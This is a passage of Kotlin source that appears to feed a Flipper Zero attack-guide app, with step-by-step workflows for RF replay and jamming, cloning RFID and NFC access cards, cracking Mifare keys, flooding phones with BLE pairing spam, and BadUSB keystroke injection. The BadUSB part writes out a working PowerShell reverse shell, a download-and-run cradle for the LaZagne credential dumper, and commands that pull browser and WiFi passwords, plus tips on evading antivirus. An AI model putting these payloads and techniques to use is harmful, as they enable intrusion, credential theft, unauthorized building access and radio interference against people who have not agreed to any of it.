                    tips = listOf("Common frequencies: 315MHz (US), 433.92MHz (EU), 868MHz (EU alarms), 418MHz (old US)")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Use the Frequency for Reading",
                    description = "Now go to Sub-GHz → Read → manually set the frequency to what you just found. Then capture as normal.",
                    commands = listOf(Command("Manual tune", "Sub-GHz → Read → [set frequency]", Device.FLIPPER_CLI))
                )
            )
        ),

        Workflow(
            id = "subghz_raw",
            title = "Raw Sub-GHz Capture and Replay",
            subtitle = "Record any RF signal even if the protocol is unknown",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "When to Use Raw Mode",
                    description = "If Flipper can't decode a signal (shows 'Unknown'), use Raw mode. It records the exact RF waveform and replays it bit-for-bit. Works on almost any fixed-code signal regardless of protocol.",
                    tips = listOf("Raw replay works on: gate remotes, doorbells, RF outlets, RF fans, some alarms, old barriers")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Set Frequency",
                    description = "Use Frequency Analyzer first to identify the frequency. Then go to Sub-GHz → Read RAW → set the correct frequency.",
                    commands = listOf(Command("Navigate", "Sub-GHz → Read RAW", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Capture",
                    description = "Press OK to start recording. Press the remote button once. Press OK again to stop. The raw waveform is captured.",
                    tips = listOf("Press the remote button ONCE — multiple presses make the file confusing to replay")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save and Replay",
                    description = "Save the file. To replay: Sub-GHz → Saved → select file → Send. Test it on the target device.",
                    tips = listOf("If replay fails: try pressing Send multiple times in a row — some devices need the signal 2-3 times")
                )
            )
        ),

        Workflow(
            id = "subghz_jam",
            title = "Sub-GHz Jamming / Interference",
            subtitle = "Transmit RF noise to block signals on a frequency",
            categoryId = "subghz",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum or Unleashed"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Jamming Does",
                    description = "Transmitting noise on a frequency blocks other signals from getting through. This can prevent: remote keyfobs from working, RF gate openers from responding, car lock signals from reaching the vehicle.",
                    warning = "Intentional radio interference is illegal in most countries under FCC/Ofcom rules. Use only for testing on your own equipment.",
                    tips = listOf("Often used as a demonstration to show why rolling codes and signal encryption matter")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Create a Jam Signal File",
                    description = "Jamming is done by replaying a noise .sub file. Download a jam file for your target frequency from Flipper community resources, or create one using Sub-GHz → Read RAW with nothing to record (just captures noise).",
                    tips = listOf("Search: 'flipper zero jam sub file 433MHz' — community files exist for common frequencies")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Load and Transmit",
                    description = "Sub-GHz → Saved → select the jam file → Send. Flipper transmits continuously while you hold the button.",
                    commands = listOf(Command("Transmit", "Sub-GHz → Saved → [jam file] → Send", Device.FLIPPER_CLI))
                )
            )
        ),

        // ── RFID (125kHz) ─────────────────────────────────────────────────────

        Workflow(
            id = "rfid_read",
            title = "Read 125kHz RFID Card",
            subtitle = "Capture any EM4100, HID, or INDALA access card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open 125kHz RFID",
                    description = "Press center button → scroll to 125 kHz RFID → OK.",
                    commands = listOf(Command("Navigate", "125 kHz RFID", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Card",
                    description = "Select Read. Hold the card flat against the back of Flipper (where the RFID antenna is). The card data reads instantly.",
                    tips = listOf("Best read range: direct contact or within 1-2cm", "Works on: EM4100, EM4200, HID Prox, INDALA, PARADOX, PAC/Stanley, Gallagher, Keri")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Save It",
                    description = "After reading, press OK → Save → name it → Save. The card ID is now stored.",
                    tips = listOf("Save multiple cards — Flipper stores them all")
                )
            )
        ),

        Workflow(
            id = "rfid_emulate",
            title = "Emulate RFID Card",
            subtitle = "Make Flipper pretend to be a saved access card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Saved RFID card"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Saved Cards",
                    description = "Go to 125 kHz RFID → Saved → select the card you want to emulate.",
                    commands = listOf(Command("Navigate", "125 kHz RFID → Saved → [card name]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Emulate",
                    description = "Select Emulate. Flipper now broadcasts that card's signal. Hold the back of Flipper against any RFID reader — it responds as if it's the real card.",
                    tips = listOf("Works on doors, turnstiles, parking gates — any 125kHz reader", "Emulation stays active until you press Back")
                )
            )
        ),

        Workflow(
            id = "rfid_clone",
            title = "Clone RFID Card",
            subtitle = "Copy a card's data to a blank T5577 writable card",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "T5577 blank card or keyfob"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read the Source Card",
                    description = "First read the card you want to clone: 125 kHz RFID → Read → hold card against Flipper → save it.",
                    commands = listOf(Command("Read", "125 kHz RFID → Read", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Write to T5577",
                    description = "Place a blank T5577 card/keyfob against Flipper. From the saved card screen, select Write → T5577. Flipper programs the blank card with the original card's data.",
                    commands = listOf(Command("Write", "Saved → [card] → Write → T5577", Device.FLIPPER_CLI)),
                    tips = listOf("T5577 cards are multi-format — they auto-configure to match the protocol (EM4100, HID, etc)", "Buy T5577 cards on Amazon for ~$1 each")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Test the Clone",
                    description = "Hold the T5577 card against an RFID reader. It should respond identically to the original card.",
                    tips = listOf("If it doesn't work: the reader may be checking more than just the ID (rare for basic access control)")
                )
            )
        ),

        Workflow(
            id = "rfid_hid_prox",
            title = "Clone HID ProxCard",
            subtitle = "Copy HID 125kHz access cards used in most corporate buildings",
            categoryId = "rfid",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Target HID ProxCard"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "About HID ProxCard",
                    description = "HID ProxCard II and ProxKey are the most common 125kHz cards in office buildings, hotels, and corporate facilities. They broadcast facility code + card number — Flipper reads and emulates them perfectly.",
                    tips = listOf("HID Prox is 26-bit format in most deployments", "Orange/white card with HID logo = definitely HID ProxCard")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the HID Card",
                    description = "125 kHz RFID → Read → hold HID card against back of Flipper. It decodes as 'H10301' or 'HID Prox' with the facility code and card number displayed.",
                    commands = listOf(Command("Read", "125 kHz RFID → Read → [hold card]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Emulate or Clone",
                    description = "To use immediately: Saved → [card] → Emulate — hold Flipper to reader.\nTo make a physical clone: Write to a T5577 card.\nFlipper emulation range is ~2-3cm — same as a real card.",
                    commands = listOf(Command("Emulate", "125 kHz RFID → Saved → [card] → Emulate", Device.FLIPPER_CLI))
                )
            )
        ),

        // ── NFC ───────────────────────────────────────────────────────────────

        Workflow(
            id = "nfc_read_mifare",
            title = "Read NFC Card (Mifare Classic)",
            subtitle = "Dump and save Mifare Classic 1K/4K access cards",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open NFC",
                    description = "Press center button → NFC → OK.",
                    commands = listOf(Command("Navigate", "NFC", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Card",
                    description = "Select Read. Hold card against the top of Flipper (NFC antenna). Flipper reads the UID instantly, then attempts to read sector data.",
                    tips = listOf("Mifare Classic 1K: most hotel keys, gym cards, transit cards, parking cards")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Try to Read All Sectors",
                    description = "Flipper will attempt to crack Mifare Classic sectors using built-in known keys. If it decrypts them, you get the full card dump. If not, use Mfkey32 (next workflow).",
                    tips = listOf("Many cards use default keys (0xFFFFFFFFFFFF or 0xA0A1A2A3A4A5) — Flipper often gets full reads")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Save and Emulate",
                    description = "Save the card. To emulate: NFC → Saved → select card → Emulate. Hold Flipper to reader.",
                    tips = listOf("Emulating hotel keys works on many systems — lets you duplicate your key")
                )
            )
        ),

        Workflow(
            id = "nfc_mfkey32",
            title = "Crack Mifare Classic Keys (Mfkey32)",
            subtitle = "Attack encrypted Mifare sectors to unlock a full card dump",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware", "Mifare Classic card already read (partial)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Mfkey32 Does",
                    description = "Mifare Classic encryption (Crypto1) is weak and crackable. When a reader authenticates your card, Flipper logs the nonces. Mfkey32 cracks the sector keys from those nonces — usually in seconds.",
                    tips = listOf("Works on Mifare Classic 1K and 4K", "Doesn't work on Mifare Plus, DESFire, or UltraLight")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Collect Nonces from a Real Reader",
                    description = "On Flipper: NFC → Detect Reader. Hold Flipper near the target card reader (door, turnstile, etc.) — DON'T put a card on it, just the Flipper. Leave for 10-30 seconds. Flipper logs the reader's challenges.",
                    commands = listOf(Command("Navigate", "NFC → Detect Reader", Device.FLIPPER_CLI)),
                    tips = listOf("Flipper pretends to be a Mifare card to collect the reader's nonce data")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run Mfkey32 on Flipper",
                    description = "After collecting nonces, go to NFC → Extras → Mfkey32. Flipper runs the attack on-device. It discovers the sector keys.",
                    commands = listOf(Command("Navigate", "NFC → Extras → Mfkey32", Device.FLIPPER_CLI)),
                    tips = listOf("On-device cracking takes 1-5 minutes depending on number of sectors")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Re-Read the Card",
                    description = "Now go back to NFC → Read and scan the target card again. Flipper uses the cracked keys to decrypt all sectors — you get a complete dump.",
                    tips = listOf("Save the full dump and emulate it to clone access")
                )
            )
        ),

        Workflow(
            id = "nfc_emv_read",
            title = "Read Bank Card (EMV / NFC Pay)",
            subtitle = "Extract public data from contactless credit/debit cards",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Can Be Read",
                    description = "Most contactless bank cards (Visa/MC/Amex with the wave symbol) broadcast public data over NFC: card number, expiry date, recent transactions (on some cards), and the cardholder name. The CVV2 and PIN are NOT accessible.",
                    tips = listOf("This data is the same as what's printed on the front of the card — not a security risk by itself")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Card",
                    description = "NFC → Read → hold contactless card against top of Flipper. Flipper detects it as EMV and reads available data fields.",
                    commands = listOf(Command("Navigate", "NFC → Read", Device.FLIPPER_CLI)),
                    tips = listOf("Visa cards often broadcast the most data", "Some newer cards have limited broadcast data by design")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "View Data",
                    description = "After reading, Flipper shows: Primary Account Number (PAN), expiry date, transaction log (on some cards), and application label. Card number and expiry are displayed.",
                    tips = listOf("Save the read for documentation", "EMV cards CANNOT be emulated to make payments — EMV cryptograms prevent this")
                )
            )
        ),

        Workflow(
            id = "nfc_ntag",
            title = "Read and Write NTAG (NFC Stickers)",
            subtitle = "Clone or program NFC stickers and tags",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "NTAG213/215/216 sticker (optional for write)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Read an NTAG",
                    description = "NFC → Read → hold an NFC sticker/tag against Flipper. NTAG data (URL, text, WiFi credentials, business card) is read and displayed.",
                    commands = listOf(Command("Navigate", "NFC → Read", Device.FLIPPER_CLI)),
                    tips = listOf("NTAG213: 144 bytes (URL/text), NTAG215: 504 bytes (Amiibo), NTAG216: 888 bytes")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Emulate an NTAG",
                    description = "Save the tag then Emulate it. Flipper pretends to be the tag — great for sharing WiFi credentials, vCard, or URLs without a physical sticker.",
                    commands = listOf(Command("Emulate", "NFC → Saved → [tag] → Emulate", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Write to a Blank NTAG",
                    description = "Load a saved tag → select Write. Hold a blank writable NTAG sticker against Flipper to program it.",
                    tips = listOf("NTAG215 stickers are cheap on Amazon (~50 for $10) and compatible with Nintendo Amiibo emulation")
                )
            )
        ),

        Workflow(
            id = "nfc_magic_write",
            title = "Write Magic Card (Clone UID)",
            subtitle = "Program a blank magic card to clone any Mifare card's UID",
            categoryId = "nfc",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Gen1a or Gen2 Magic card (blank UID-writable Mifare clone)"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Magic Cards vs Regular Blanks",
                    description = "Regular Mifare cards have a factory-locked UID. Magic cards (Gen1a, Gen2, CUID, FUID) allow writing the UID block — this lets you make a physical clone that passes UID-only access systems.",
                    tips = listOf("Gen2/CUID magic cards work on most readers including those that detect Gen1a", "Buy on AliExpress: search 'Gen2 magic card Mifare 1K'")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Read the Target Card First",
                    description = "NFC → Read → scan the original card. Get the UID and sector data.",
                    commands = listOf(Command("Read original", "NFC → Read → [original card]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Write to Magic Card",
                    description = "Place the magic card on Flipper. Go to NFC → Saved → select your saved card → Write → Magic Card. Flipper writes the full dump including the UID.",
                    commands = listOf(Command("Write magic", "NFC → Saved → [card] → Write → Magic Card", Device.FLIPPER_CLI)),
                    tips = listOf("Works on Gen1a and Gen2 magic cards", "The clone will have the same UID — passes readers that only check UID")
                )
            )
        ),

        // ── BADUSB ────────────────────────────────────────────────────────────

        Workflow(
            id = "badusb_basic",
            title = "Run a BadUSB Payload",
            subtitle = "Execute keystroke injection attacks via USB",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "USB-A to USB-C cable or USB-C to USB-C", "Target unlocked computer"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What Is BadUSB?",
                    description = "Flipper appears as a USB keyboard to any computer. It then 'types' a payload at machine speed — much faster than any human. This lets you run commands, download files, or change settings on any unlocked PC in seconds.",
                    tips = listOf("Works on Windows, Mac, Linux, ChromeOS — anything with a USB keyboard input", "Target must be unlocked — BadUSB can't bypass lock screens")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Get or Write a Payload",
                    description = "Payloads are .txt files in Ducky Script format. Flipper has some built-in samples. Community payloads: github.com/UncleRus/FlipperZeroTutorials and github.com/Lugsole/flipper_scripts — download via Flipper Mobile App → Files.",
                    tips = listOf("Ducky Script is simple: DELAY, STRING, ENTER, GUI (Windows key), ALT, SHIFT, etc.")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Load the Payload",
                    description = "On Flipper: press center → BadUSB → select your payload file → press OK.",
                    commands = listOf(Command("Navigate", "BadUSB → [payload file]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Plug In and Run",
                    description = "Plug Flipper into the target computer's USB port. Press OK to start. Flipper types the entire payload automatically.",
                    warning = "Computer must be unlocked. Some EDR/AV tools detect rapid typing — add DELAY 200 between commands in sensitive payloads"
                )
            )
        ),

        Workflow(
            id = "badusb_reverse_shell",
            title = "BadUSB — Reverse Shell",
            subtitle = "Open a remote shell on a Windows PC via PowerShell",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Listener PC on same network", "Target unlocked Windows machine"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Set Up Your Listener First",
                    description = "On your PC, start a netcat listener BEFORE plugging Flipper in. Replace YOUR_IP with your machine's IP and choose a port.",
                    commands = listOf(Command("Start listener", "nc -lvnp 4444", Device.PC)),
                    tips = listOf("Your IP on the local network: run 'ip a' or 'ipconfig' on your PC")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Write the Payload",
                    description = "Create a .txt file on Flipper's SD card at /badusb/reverse_shell.txt with this content (replace IP and port):\n\nGUI r\nDELAY 500\nSTRING powershell -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+\"PS \"+(pwd).Path+\"> \";$se=[text.encoding]::ASCII.GetBytes($rb);$s.Write($se,0,$se.Length)}\"\nENTER",
                    commands = listOf(Command("Payload file", "/badusb/reverse_shell.txt", Device.FLIPPER_CLI)),
                    tips = listOf("Change YOUR_IP to your listener machine's IP", "This opens a hidden PowerShell window that connects back to you")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run It",
                    description = "Plug Flipper into target Windows PC. BadUSB → select reverse_shell.txt → OK. Within 2 seconds a shell connects to your listener.",
                    warning = "Windows Defender may block this — add DELAY 300 between commands and consider obfuscated variants"
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "You Have a Shell",
                    description = "Your netcat listener shows a PowerShell prompt from the target machine. Run any Windows command: whoami, ipconfig, dir, net user, etc.",
                    tips = listOf("Upgrade shell: use ConPtyShell or nishang Invoke-PowerShellTcp for a better interactive session")
                )
            )
        ),

        Workflow(
            id = "badusb_wifi_grab",
            title = "BadUSB — Extract Saved WiFi Passwords",
            subtitle = "Dump all saved WiFi passwords from Windows in seconds",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Unlocked Windows PC"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "What It Does",
                    description = "Windows stores all saved WiFi passwords in plain text accessible to any admin user. This payload opens a hidden PowerShell, dumps every saved password, and sends them to you — either via exfil URL or saves locally.",
                    tips = listOf("Works on Windows 7, 8, 10, 11", "Requires admin account — most home PCs run as admin by default")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Load the WiFi Grab Payload",
                    description = "Flipper community payload. Load it via Flipper Mobile App → browse to /badusb/ → WiFi_Passwords.txt. Or write it manually using: netsh wlan show profiles then netsh wlan show profile [name] key=clear.",
                    commands = listOf(Command("Payload command", "netsh wlan show profiles | netsh wlan show profile * key=clear", Device.PC))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run",
                    description = "Plug Flipper into the Windows machine. BadUSB → select payload → OK. The payload types at machine speed — done in under 3 seconds. Results appear on screen or are saved.",
                    tips = listOf("Combine with export-to-clipboard payload to paste results somewhere you can read them")
                )
            )
        ),

        Workflow(
            id = "badusb_credential_grab",
            title = "BadUSB — Credential Harvesting",
            subtitle = "Extract browser passwords and Windows credentials",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Unlocked Windows PC"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Targets",
                    description = "Browser passwords (Chrome, Edge, Firefox) are stored locally and accessible to the logged-in user. Windows also stores cached credentials in the Credential Manager.",
                    tips = listOf("Chrome/Edge store passwords in an SQLite DB encrypted with DPAPI — decryptable by the user's session")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Download LaZagne Payload",
                    description = "LaZagne is the go-to credential dumping tool. The BadUSB payload opens PowerShell and downloads + runs it in memory:\n\nGUI r → STRING powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/AlessandroZ/LaZagne/master/Windows/laZagne.exe')\" → ENTER",
                    tips = listOf("Or use a hosted copy on your own server so you don't depend on GitHub being up")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Simpler: Just Dump Chrome Passwords",
                    description = "For Chrome only, the payload can just copy the database:\nSTRING copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" %TEMP%\\ld.db\nThis file contains encrypted passwords — decrypt with chromepass, chrome-password-extractor, or SharpChrome on your machine.",
                    commands = listOf(Command("Chrome DB path", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", Device.PC)),
                    tips = listOf("Must decrypt on the SAME machine or use the user's master key — DPAPI ties to the user profile")
                )
            )
        ),

        Workflow(
            id = "badusb_ble",
            title = "BadUSB — BLE Exfiltration Payload",
            subtitle = "Exfiltrate data over Bluetooth LE instead of WiFi",
            categoryId = "badusb",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Unlocked Windows PC with Bluetooth"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Why BLE Exfil?",
                    description = "WiFi exfil payloads require the target to have internet access and may be blocked by firewalls. BLE exfil is short range but bypasses network monitoring entirely — data goes directly to your phone or BLE receiver.",
                    tips = listOf("Range: ~10-30 meters for BLE")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Set Up BLE Receiver",
                    description = "On your Android phone, install a BLE serial app (e.g., Serial Bluetooth Terminal). Start it and wait in receive mode. Note the BLE MAC of your phone.",
                    tips = listOf("Alternative: use another Flipper as the BLE receiver")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Load the Payload",
                    description = "The payload uses PowerShell to pair and send data via BLE. Because Windows BLE scripting is complex, a common approach is: dump data to temp file → use Bluetooth File Transfer → script the send. Community payloads handle this.",
                    tips = listOf("Search Flipper community: 'BLE exfil badusb payload'")
                )
            )
        ),

        // ── BLUETOOTH / BLE ───────────────────────────────────────────────────

        Workflow(
            id = "ble_spam",
            title = "BLE Spam — iOS Notification Flood",
            subtitle = "Flood nearby iPhones with fake Bluetooth pairing popups",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open BLE Spam App",
                    description = "On Flipper with Momentum: press center button → Apps → Bluetooth → BLE Spam → OK.",
                    commands = listOf(Command("Navigate", "Apps → Bluetooth → BLE Spam", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select iOS Attack",
                    description = "In BLE Spam, select iOS → choose the type: AirDrop, AirPods, AppleTV, iPhone Pair, or Crash iOS (aggressive). Each creates a different popup on nearby iPhones.",
                    tips = listOf("Crash iOS variant: rapidly rotates through Apple device advertisements — can cause lag on older iPhones", "'iPhone Pair' popup is the most convincing looking")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Start Spamming",
                    description = "Press OK to start. Flipper broadcasts fake BLE advertisements continuously. iPhones nearby show persistent pairing/notification popups.",
                    tips = listOf("Range: ~10m in open space", "Victims can dismiss but popups immediately return")
                ),
                WorkflowStep(
                    stepNumber = 4,
                    title = "Stop",
                    description = "Press Back or center button to stop. Popups on victim devices stop immediately.",
                    tips = listOf("iOS 17.2+ patched some of the most aggressive variants — Momentum team updates BLE Spam accordingly")
                )
            )
        ),

        Workflow(
            id = "ble_android_spam",
            title = "BLE Spam — Android Notification Flood",
            subtitle = "Trigger fake Bluetooth pairing notifications on Android phones",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open BLE Spam",
                    description = "Apps → Bluetooth → BLE Spam → Android.",
                    commands = listOf(Command("Navigate", "Apps → Bluetooth → BLE Spam → Android", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Attack Type",
                    description = "Options: Google Fast Pair (shows Google pairing notification), Samsung BLE (Samsung device popup), Google Home Device (fake smart home device), or Generic BLE Pair.",
                    tips = listOf("Google Fast Pair works on most Android phones — shows a notification even without BT settings open", "Samsung BLE works specifically on Galaxy devices")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run",
                    description = "Press OK. Nearby Android phones show pairing/notification banners.",
                    tips = listOf("Effectiveness varies by Android version and BT settings", "Android 13+ requires explicit Fast Pair permission — older Androids are more vulnerable")
                )
            )
        ),

        Workflow(
            id = "ble_windows_spam",
            title = "BLE Spam — Windows SwiftPair Popups",
            subtitle = "Flood Windows 10/11 machines with fake Bluetooth pairing popups",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero with Momentum firmware"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open BLE Spam",
                    description = "Apps → Bluetooth → BLE Spam → Windows.",
                    commands = listOf(Command("Navigate", "Apps → Bluetooth → BLE Spam → Windows", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "SwiftPair Attack",
                    description = "Windows 10/11 has 'Swift Pair' — a feature that shows a toast notification when a new BLE device is nearby. Flipper spams these by advertising fake Microsoft device profiles. Each notification asks 'Connect [Device Name]?'",
                    tips = listOf("Works when target has Bluetooth enabled and Swift Pair notifications on (default in Windows 10/11)")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Run",
                    description = "Press OK. Windows machines nearby get persistent notification spam.",
                    tips = listOf("Can disable Swift Pair permanently: Settings → Bluetooth → Show notifications for Swift Pair → OFF")
                )
            )
        ),

        Workflow(
            id = "ble_awok_spam",
            title = "BLE Spam via AWOK Marauder",
            subtitle = "Run BLE spam attacks from AWOK for more range and speed",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.AWOK),
            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open BLE Menu on AWOK",
                    description = "On the AWOK screen, navigate to BLE using the on-device buttons.",
                    commands = listOf(Command("Navigate", "BLE", Device.MARAUDER))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Select Spam Type",
                    description = "Choose from: iOS (Apple device advertisements), Android (Google Fast Pair), Windows (SwiftPair), Samsung (Galaxy popups), All (cycles through all types rapidly).",
                    commands = listOf(Command("Options", "BLE → BLE Spam → [iOS / Android / Windows / Samsung / All]", Device.MARAUDER)),
                    tips = listOf("'All' mode is most chaotic — hits every platform simultaneously")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Start and Stop",
                    description = "Select your type and press Start. AWOK's ESP32 BLE radio blasts advertisements. Stop with the back/stop button.",
                    tips = listOf("AWOK's ESP32 has slightly more BLE range than Flipper's BLE chip")
                )
            )
        ),

        Workflow(
            id = "bt_scan",
            title = "Bluetooth Device Scan",
            subtitle = "Discover all Bluetooth Classic and BLE devices nearby",
            categoryId = "bluetooth",
            hardware = listOf(Hardware.FLIPPER, Hardware.AWOK),
            prerequisites = listOf("Flipper Zero and/or AWOK Dual Mini v3"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "BLE Scan on AWOK",
                    description = "AWOK Marauder: BLE → BLE Scan → Start. AWOK lists all BLE devices it sees with name, MAC, RSSI, and manufacturer data.",
                    commands = listOf(Command("Navigate", "BLE → BLE Scan", Device.MARAUDER)),
                    tips = listOf("Manufacturer data often reveals device brand even if name is blank")
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Flipper Bluetooth Scanner",
                    description = "On Flipper: Apps → Bluetooth → Bluetooth Scanner (if installed). Or check the BLE Spam app's scan mode.",
                    commands = listOf(Command("Navigate", "Apps → Bluetooth → [Scanner app]", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Track a Device by MAC",
                    description = "Note a device's MAC address. Many devices randomize MACs — but older or pairing-mode devices don't. A static MAC can be tracked to follow a device's movement.",
                    tips = listOf("Apple devices: use rotating random MACs. Older Android/Windows devices: static MAC often")
                )
            )
        ),

        // ── INFRARED ──────────────────────────────────────────────────────────

        Workflow(
            id = "ir_learn",
            title = "Learn an IR Remote Signal",
            subtitle = "Clone any infrared remote into Flipper",
            categoryId = "infrared",
            hardware = listOf(Hardware.FLIPPER),
            prerequisites = listOf("Flipper Zero", "Any IR remote"),
            steps = listOf(
                WorkflowStep(
                    stepNumber = 1,
                    title = "Open Infrared",
                    description = "Press center button → Infrared → OK.",
                    commands = listOf(Command("Navigate", "Infrared", Device.FLIPPER_CLI))
                ),
                WorkflowStep(
                    stepNumber = 2,
                    title = "Learn a New Remote",
                    description = "Select Learn New Remote → give it a name. Point your remote AT Flipper (within 10cm) and press a button. Flipper captures and decodes the signal.",
                    tips = listOf("Capture multiple buttons — each save is for one button press")
                ),
                WorkflowStep(
                    stepNumber = 3,
                    title = "Test and Save",
                    description = "After capture, press Send to test it works on your TV/device. Then save.",
                    tips = listOf("Works on: TVs, AC units, projectors, stereos, fans, cable boxes, streaming boxes")
                )
            )
        ),

        Workflow(
            id = "ir_universal",
            title = "Universal TV Remote",
            subtitle = "Use Flipper's built-in library to control any TV",
            categoryId = "infrared",
